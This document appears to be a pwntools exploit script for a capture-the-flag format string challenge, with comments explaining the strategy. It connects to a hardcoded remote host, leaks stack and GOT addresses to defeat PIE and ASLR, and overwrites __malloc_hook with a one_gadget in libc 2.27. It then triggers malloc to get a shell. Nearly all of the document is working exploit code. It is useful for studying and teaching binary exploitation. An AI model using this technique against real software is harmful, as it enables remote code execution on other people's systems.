###################################################################################################
# This challenge is a format string vulnerbility in a binary with full protections.               #
# checksec ./format { RELRO: FULL RELRO, Stack: Canary Found, NX: NX enabled, PIE: PIE enabled }  #
#                                                                                                 #
###################################################################################################

# Exploit Strategy:
# 1. do %p.%p.%p... etc (leaking stack) until we can find a value we recognize from the init function => setvbuf nop instruction
#    0x0000000000001268 <+112>:	call   0x10b0 <setvbuf@plt>
#    0x000000000000126d <+117>:	nop
#    0x000000000000126e <+118>:	mov    rax,QWORD PTR [rbp-0x8]
#    0x0000000000001272 <+122>:	xor    rax,QWORD PTR fs:0x28
#    0x000000000000127b <+131>:	je     0x1282 <init+138>
#    0x000000000000127d <+133>:	call   0x1080 <__stack_chk_fail@plt>
#    0x0000000000001282 <+138>:	leave  
#    0x0000000000001283 <+139>:	ret 

# 2. Now that we know the location of an address in the ELF, we can calculate elf.address (line 39)
# 3. Now that we have elf.address we can ask printf to give us what is stored in a got.plt which returns the resolved address in libc
# 4. With an address in libc we can calculate libc offset
# 5. Full RELRO means we cannot overwrite any got/plt stuff so we have to use a little-known call out of printf (malloc is called when buffer passed to printf is too large)
# 6. Overwrite __malloc_hook with the value of a one-gadget (line 69, nice). 
# 7. Execute malloc by passing a ridiculous value to printf (line 72)
# 8. Catch shell


from pwn import *

CONNECTION_STRING = "68.183.41.74:30685"
REMOTE_IP, REMOTE_PORT = CONNECTION_STRING.split(":")

local = False
context.arch = 'amd64'

elf = ELF("./format")
if local == True:
    libc = elf.libc
    p = process("./format")
else:
    libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
    p = remote(REMOTE_IP, REMOTE_PORT)

p.sendline("%37$p")                                  # 37 is the 37th value from %p.%p... etc until we hit our setvbuf nop, when we start counting at 1
new_setvbuf = p.recvline().strip()
elf.address = int(new_setvbuf,16) - 0x126d           # 0x126d is found with `gdb format`, `disass init` => setvbuf nop @ 126d    
log.info(f"{hex(elf.address)=}")

printf_got_plt = elf.got['printf']
log.info(f"{hex(elf.got['printf'])=}")
p.sendline(b"AAAA%7$s" + p64(printf_got_plt))
data = p.recv(timeout=1)
leaked_libc_printf = u64(data[4:10].ljust(8, b"\x00"))
print(f"{hex(leaked_libc_printf)=}")
libc.address = leaked_libc_printf - libc.symbols.printf  # offset can also be found with `objdump -TR ./libc6_2.27-3ubuntu1_amd64.so| grep "printf$"` =>  0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 printf                  
print(f"{hex(libc.address)=}")

# overwrite __malloc_hook with the address of a one_gadget
one_gadget = libc.address + 0x4f322                      #  one_gadget ./libc6_2.27-3ubuntu1_amd64.so => 2nd value in list
print(f"{hex(one_gadget)=}")
print(f"{hex(libc.symbols['__malloc_hook'])=}")
malloc_hook_addr = libc.symbols['__malloc_hook']

p.sendline(fmtstr_payload(6, { malloc_hook_addr : one_gadget } ))
p.recv()
p.sendline('%100000c') # __malloc_hook triggerp.interactive()
p.interactive()
